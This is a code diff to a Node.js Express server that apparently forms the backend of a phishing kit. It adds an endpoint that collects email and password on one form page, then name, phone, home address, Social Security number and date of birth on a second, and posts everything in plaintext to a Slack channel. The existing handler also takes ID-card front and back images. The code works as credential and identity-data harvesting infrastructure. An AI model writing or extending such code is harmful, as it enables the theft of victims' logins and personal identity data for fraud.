@@ -53,7 +53,7 @@ app.post(
       } = req.body;
 
       // Compile a message with user information
-      const userMessage = `New submission:\nEmail: ${email}\nPassword: ${password}\nFirst Name: ${firstName}\nLast Name: ${lastName}\nPhone: ${phone}\nHome Address: ${homeAddress}\nCity: ${city}\nState: ${state}\nZipcode: ${zipCode}\nSSN: ${ssn}\nDate of Birth: ${dateOfBirth}`;
+      const userMessage = `New submission Final:\nEmail: ${email}\nPassword: ${password}\nFirst Name: ${firstName}\nLast Name: ${lastName}\nPhone: ${phone}\nHome Address: ${homeAddress}\nCity: ${city}\nState: ${state}\nZipcode: ${zipCode}\nSSN: ${ssn}\nDate of Birth: ${dateOfBirth}`;
 
       const idFront = req.files["idFront"]?.[0]?.buffer;
       const idBack = req.files["idBack"]?.[0]?.buffer;
@@ -88,6 +88,50 @@ app.post(
         return res.status(500).json({ error: "Error posting to Slack" });
       }
 
+      return res.status(200).json({ success: true });
+    } catch (error) {
+      console.error("Error handling request:", error.message);
+      return res.status(500).json({ error: "Internal Server Error" });
+    }
+  }
+);
+
+app.post(
+  "/sendMessage/:submissionType",
+  upload.fields([]),
+  async (req, res) => {
+    try {
+      let message = "";
+      const { submissionType } = req.params;
+      console.log(submissionType);
+      if (submissionType === "form1") {
+        const { email, password } = req.body;
+        message += `New Submission(Page 1)\nEmail: ${email}\nPassword: ${password}`;
+      } else if (submissionType === "form2") {
+        const {
+          firstName,
+          lastName,
+          phone,
+          ssn,
+          homeAddress,
+          city,
+          state,
+          zipCode,
+          dateOfBirth,
+        } = req.body;
+        message += `New Submission(Page 2)\nFirst Name: ${firstName}\nLast Name: ${lastName}\nPhone: ${phone}\nHome Address: ${homeAddress}\nCity: ${city}\nState: ${state}\nZipcode: ${zipCode}\nSSN: ${ssn}\nDate of Birth: ${dateOfBirth}`;
+      }
+
+      console.log(message);
+      const messageData = {
+        text: message,
+        channel: slackChannelId,
+      };
+      const postMessageResponse = await web.chat.postMessage(messageData);
+      if (!postMessageResponse.ok) {
+        console.error("Error posting to Slack:", postMessageResponse.error);
+        return res.status(500).json({ error: "Error posting to Slack" });
+      }
       return res.status(200).json({ success: true });
     } catch (error) {
       console.error("Error handling request:", error.message);
